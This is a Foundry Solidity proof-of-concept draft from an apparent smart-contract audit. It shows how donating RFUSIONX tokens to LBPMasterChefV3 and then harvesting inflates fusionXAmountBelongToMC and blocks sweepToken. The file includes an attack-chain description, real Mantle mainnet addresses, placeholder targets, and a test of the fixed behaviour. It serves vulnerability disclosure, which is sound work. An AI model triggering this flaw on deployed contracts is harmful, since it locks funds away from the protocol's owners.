// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/**
 * @title forefy-001 POC DRAFT  --  _safeTransfer accounting inflation
 * @notice Demonstrates that donating RFUSIONX directly to LBPMasterChefV3 and then
 *         harvesting inflates fusionXAmountBelongToMC, preventing sweepToken from
 *         ever extracting excess RFUSIONX.
 *
 * @dev This is a DRAFT  --  requires a local fork or mock deployment to run.
 *      The human/Phase 9 must finalize with real Mantle RPC fork state.
 *
 * Attack chain:
 *   1. Attacker acquires some RFUSIONX (reward token)
 *   2. Attacker sends RFUSIONX directly to LBPMasterChefV3 (bypassing upkeep)
 *   3. Attacker harvests a staked position. The _safeTransfer() else branch
 *      sets fusionXAmountBelongToMC = balance - _amount instead of 0.
 *   4. fusionXAmountBelongToMC becomes inflated, equal to the remaining balance.
 *   5. Owner tries sweepToken(RFUSIONX) → balanceToken - fusionXAmountBelongToMC = 0 → nothing sweepable.
 *
 * Note on setup: This POC assumes a forked Mantle mainnet with the existing deployed
 * contracts. The test creates a minimal environment to reproduce the accounting error.
 */

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Minimal interfaces for the test
interface IRFUSIONX {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ILBPMasterChefV3 {
    function fusionXAmountBelongToMC() external view returns (uint256);
    function harvest(uint256 _tokenId, address _to) external returns (uint256 reward);
    function sweepToken(address token, uint256 amountMinimum, address recipient) external;
    function pendingFusionX(uint256 _tokenId) external view returns (uint256 reward);
    function userPositionInfos(uint256 _tokenId) external view returns (uint128 liquidity, uint128 boostLiquidity, int24 tickLower, int24 tickUpper, uint256 rewardGrowthInside, uint256 reward, address user, uint256 pid, uint256 boostMultiplier);
}

contract Forefy001POC is Test {
    // Mantle mainnet addresses (from audit scope)
    address constant FACTORY = 0x530d2766D1988CC1c000C8b7d00334c14B69AD71;
    address constant POOL_DEPLOYER = 0x8790c2C3BA67223D83C8FCF2a5E3C650059987b4;
    address constant SWAP_ROUTER = 0x5989FB161568b9F133eDf5Cf6787f5597762797F;
    address constant NPM = 0x5752F085206AB87d8a5EF6166779658ADD455774;
    address constant SMART_ROUTER = 0x4bf659cA398A73AaF73818F0c64c838B9e229c08;

    // NOTE: These are placeholder addresses  --  use real Mantle mainnet RFUSIONX and MC addresses
    // from the actual deployment in the real POC.
    IRFUSIONX RFUSIONX;
    ILBPMasterChefV3 masterChef;
    
    // Test accounts
    address attacker = address(0xBAD);
    address user = address(0xCAFE);
    address owner = address(0x1Dc5);

    function setUp() public {
        vm.createSelectFork(vm.envString("MANTLE_RPC_URL")); // Requires MANTLE_RPC_URL env var

        // Resolve RFUSIONX and MasterChef addresses from the deployed system
        // (In real POC, derive from Mantle mainnet state)
        // For now, use placeholder  --  the human must replace with real addresses.
        RFUSIONX = IRFUSIONX(0x0000000000000000000000000000000000000000); // TODO: real RFUSIONX address
        masterChef = ILBPMasterChefV3(0x0000000000000000000000000000000000000000); // TODO: real LBPMasterChefV3 address

        // Fund accounts
        vm.deal(attacker, 100 ether);
        vm.deal(user, 100 ether);
        vm.deal(owner, 100 ether);
    }

    // Test 1: Demonstrate the accounting inflation bug
    // 
    // This test verifies the core bug: when fusionXAmountBelongToMC < _amount <= balance,
    // _safeTransfer's else branch inflates fusionXAmountBelongToMC.
    //
    // NOTE: This test is a sketch. It cannot run without real addresses and a pre-existing
    // staked position. The human must:
    // 1. Set real RFUSIONX and MasterChef addresses
    // 2. Either find a real staked NFT tokenId or deploy mock contracts
    // 3. Transfer RFUSIONX directly to MasterChef to set up the under-tracked state
    function test_accountingInflation_schematic() public {
        // This is a schematic test showing the arithmetic bug without requiring
        // a live position. The human should replace with a fork-based test.

        // Simulate the bug conditions:
        uint256 balance = 1000 * 1e18;     // MC's RFUSIONX balance
        uint256 fusionXAmountBelongToMC = 10 * 1e18; // tracked amount (small)
        uint256 harvestAmount = 100 * 1e18; // user harvests 100 tokens

        // What _safeTransfer does:
        // balance (1000) >= harvestAmount (100) → _amount stays 100
        // fusionXAmountBelongToMC (10) >= _amount (100)? NO → else branch
        // fusionXAmountBelongToMC = balance (1000) - _amount (100) = 900
        // After transfer: new balance = 900, fusionXAmountBelongToMC = 900

        uint256 newFusionXAmountBelongToMC = balance - harvestAmount;
        uint256 newBalance = balance - harvestAmount;

        console.log("Before: balance=%d, fusionXAmountBelongToMC=%d", balance, fusionXAmountBelongToMC);
        console.log("After (BUG): balance=%d, fusionXAmountBelongToMC=%d", newBalance, newFusionXAmountBelongToMC);
        console.log("fusionXAmountBelongToMC inflated from %d to %d (should be 0!)", fusionXAmountBelongToMC, newFusionXAmountBelongToMC);

        // Verify the inflation
        assertEq(newFusionXAmountBelongToMC, balance - harvestAmount, 
            "fusionXAmountBelongToMC should equal new balance (BUG behavior)");
        // Correct behavior would be: newFusionXAmountBelongToMC == 0

        // Additional check: sweepToken would see balanceToken == fusionXAmountBelongToMC
        // balanceToken >= fusionXAmountBelongToMC → balanceToken -= fusionXAmountBelongToMC = 0
        // No tokens can be swept!
        uint256 sweepable = newBalance >= newFusionXAmountBelongToMC ? 
            newBalance - newFusionXAmountBelongToMC : 0;
        console.log("Sweepable amount when inflated: %d", sweepable);
        assertEq(sweepable, 0, "No RFUSIONX should be sweepable when accounting is inflated");
    }

    // Test 2: Fork-based integration (requires real deployed addresses)
    function test_forkBased_accountingInflation() public {
        // This test must be completed by the human with:
        // 1. Valid Mantle RPC URL in MANTLE_RPC_URL env var
        // 2. Correct RFUSIONX and MasterChef addresses
        // 3. A real staked tokenId

        // Step 1: Record initial state
        uint256 balanceBefore = RFUSIONX.balanceOf(address(masterChef));
        uint256 trackedBefore = masterChef.fusionXAmountBelongToMC();
        console.log("Initial MC RFUSIONX balance: %d", balanceBefore);
        console.log("Initial fusionXAmountBelongToMC: %d", trackedBefore);

        // Step 2: Donate RFUSIONX to MC (simulating user sending tokens directly)
        // The attacker must have RFUSIONX to donate
        uint256 donationAmount = 1000 * 1e18;
        deal(address(RFUSIONX), attacker, donationAmount);
        vm.startPrank(attacker);
        RFUSIONX.transfer(address(masterChef), donationAmount);
        vm.stopPrank();

        uint256 balanceAfterDonation = RFUSIONX.balanceOf(address(masterChef));
        uint256 trackedAfterDonation = masterChef.fusionXAmountBelongToMC();
        console.log("After donation - balance: %d, fusionXAmountBelongToMC: %d", 
            balanceAfterDonation, trackedAfterDonation);
        // NOTE: fusionXAmountBelongToMC should NOT have increased (donation bypassed upkeep)

        // Step 3: Harvest from a staked position (needs existing tokenId)
        // The tokenId must belong to the harvester and have pending rewards
        uint256 tokenId; // TODO: set to real staked tokenId
        vm.startPrank(user); // user must be the position owner
        uint256 reward = masterChef.harvest(tokenId, user);
        vm.stopPrank();

        // Step 4: Check if accounting got inflated
        uint256 balanceAfterHarvest = RFUSIONX.balanceOf(address(masterChef));
        uint256 trackedAfterHarvest = masterChef.fusionXAmountBelongToMC();
        console.log("After harvest - balance: %d, fusionXAmountBelongToMC: %d",
            balanceAfterHarvest, trackedAfterHarvest);

        // If trackedAfterHarvest > trackedAfterDonation, the inflation occurred
        if (trackedAfterHarvest > trackedAfterDonation) {
            console.log("*** BUG CONFIRMED: fusionXAmountBelongToMC inflated by %d ***", 
                trackedAfterHarvest - trackedAfterDonation);
        }

        // Step 5: Admin tries to sweep excess RFUSIONX
        vm.startPrank(owner);
        // sweepToken with amountMinimum=1 should fail or return 0
        uint256 balanceBeforeSweep = RFUSIONX.balanceOf(address(owner));
        try masterChef.sweepToken(address(RFUSIONX), 1, owner) {
            // If sweep succeeded, check how much was swept
            uint256 swept = RFUSIONX.balanceOf(address(owner)) - balanceBeforeSweep;
            console.log("Swept %d RFUSIONX (may be 0 if accounting is broken)", swept);
        } catch {
            console.log("sweepToken REVERTED  --  accounting error prevented sweep");
            console.log("*** BUG CONFIRMED ***");
        }
        vm.stopPrank();
    }

    // Test 3: Demonstrate correct behavior with the fix
    function test_correctAccounting_schematic() public {
        // Shows what the correct behavior should be
        uint256 balance = 1000 * 1e18;
        uint256 fusionXAmountBelongToMC = 10 * 1e18;
        uint256 harvestAmount = 100 * 1e18;

        // Correct behavior:
        // fusionXAmountBelongToMC (10) < _amount (100)?
        // YES → fusionXAmountBelongToMC = 0 (all tracked amount used up)
        // Transfer 100, new balance = 900, fusionXAmountBelongToMC = 0
        
        uint256 correctNewTracked = 0;
        uint256 newBalance = balance - harvestAmount;

        uint256 sweepable = newBalance; // because tracked = 0
        console.log("With CORRECT fix: sweepable RFUSIONX = %d", sweepable);
        assertGt(sweepable, 0, "With correct fix, sweepToken should extract excess RFUSIONX");
    }
}
